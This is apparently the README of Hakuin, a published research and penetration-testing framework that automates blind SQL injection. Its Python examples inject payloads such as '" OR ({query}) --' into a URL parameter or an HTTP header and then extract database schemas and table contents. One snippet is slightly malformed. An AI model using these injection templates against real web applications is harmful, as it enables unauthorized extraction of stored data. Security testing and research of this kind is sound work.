<p align="center">
    <img width="150" src="https://raw.githubusercontent.com/pruzko/hakuin/main/logo.png">
</p>

Hakuin is a Blind SQL Injection (BSQLI) inference optimization and automation framework written in Python 3. It abstract away the inference logic and allows users to easily and efficiently extract textual data in databases (DB) from vulnerable web applications. To speed up the process, Hakuin uses pre-trained language models for DB schemas and adaptive language models in combination with opportunistic string guessing for DB content.

Make sure to read our [paper](https://github.com/pruzko/hakuin/blob/main/publications/Hakuin_WOOT_23.pdf) or see the [slides](https://github.com/pruzko/hakuin/blob/main/publications/Hakuin_HITB_23.pdf).

Hakuin been presented at academic and industrial conferences:
- [IEEE Workshop on Offsensive Technology (WOOT)](https://wootconference.org/papers/woot23-paper17.pdf), 2023
- [Hack in the Box, Phuket](https://conference.hitb.org/hitbsecconf2023hkt/session/hakuin-injecting-brains-into-blind-sql-injection/), 2023



## Installation
To install Hakuin, simply run:
```
git clone git@github.com:pruzko/hakuin.git
cd hakuin
pip install .
```
Developers should set the `-e` flag to install the framework in editable mode:
```bash
pip install -e .
```


## Examples
Once you identify a BSQLI vulnerability, you need to tell Hakuin how to inject its queries. To do this, derive a class from the `Requester` and override the `request` method. Also, the method must determine whether the query resolved to `True` or `False`.


##### Example 1 - Query Parameter Injection with Status-based Inference
```python
import requests
from hakuin import Requester

class StatusRequester(Requester):
    def request(self, ctx, query):
        r = requests.get(f'http://vuln.com/?n=XXX" OR ({query}) --')
        return r.status_code == 200
```

##### Example 2 - Header Injection with Content-based Inference
```python
class ContentRequester(Requester):
    def request(self, ctx, query):
        headers = {'vulnerable-header': f'xxx" OR ({query}) --'}
        r = requests.get(f'http://vuln.com/', headers=headers)
        return 'found' in r.content.decode()
```

To start infering data, use the `Exfiltrator` class. It requires a `DBMS` object to contruct queries and a `Requester` object to inject them. Currently, Hakuin supports SQLite and MySQL DBMSs, but will soon include more options. If you wish to support another DBMS, implement the `DBMS` interface defined in `hakuin/dbms/DBMS.py`.

##### Example 1 - Inferring SQLite DBs
```python
from hakuin.dbms import SQLite
from hakuin import Exfiltrator, Requester

class StatusRequester(Requester):
    ...

exf = Exfiltrator(requester=StatusRequester(), dbms=SQLite())
```

##### Example 2 - Inferring MySQL DBs
```python
from hakuin.dbms import MySQL
...
exf = Exfiltrator(requester=StatusRequester(), dbms=MySQL())
```

Now that eveything is set, you can start inferring DB schemas.

##### Example 1 - Inferring DB Schemas
```python
# mode:
#   'binary_search':    Use binary search
#   'model_search':     Use pre-trained models
schema = exf.exfiltrate_schema(mode='model_search')
```

##### Example 2 - Inferring DB Schemas with Metadata
```python
# metadata:
#   True:   Detect column settings (data type, nullable, primary key)
#   False:  Pass
schema = exf.exfiltrate_schema(mode='model_search', metadata=True)
```

##### Example 3 - Inferring only Table/Column Names
```python
tables = exf.exfiltrate_tables(mode='model_search')
columns = exf.exfiltrate_columns(table='users', mode='model_search')
```

Once you know the schema, you can extract the actual content.

##### Example 1 - Inferring Textual Columns
```python
# mode:
#   'binary_search':    Use binary search
#   'adaptive_search':  Use five-gram model
#   'unigram_search':   Use unigram model
#   'dynamic_search':   Dynamically identify the best strategy. This setting
#                       also enables opportunistic guessing.
res = exfiltrate_text_data(table='users', column='address', mode='dynamic_search'):
```

More examples can be found in the `tests` directory.



## For Researchers
This repository is maintained to fit the needs of security practitioners. Researchers looking to reproduce the experiments described in our paper should install the [frozen version](https://zenodo.org/record/7804243) as it contains the original code, experiment scripts, and an instruction manual for reproducing the results.


#### Cite Hakuin
```
@inproceedings{hakuin_bsqli,
  title={Hakuin: Optimizing Blind SQL Injection with Probabilistic Language Models},
  author={Pru{\v{z}}inec, Jakub and Nguyen, Quynh Anh},
  booktitle={2023 IEEE Security and Privacy Workshops (SPW)},
  pages={384--393},
  year={2023},
  organization={IEEE}
}
```
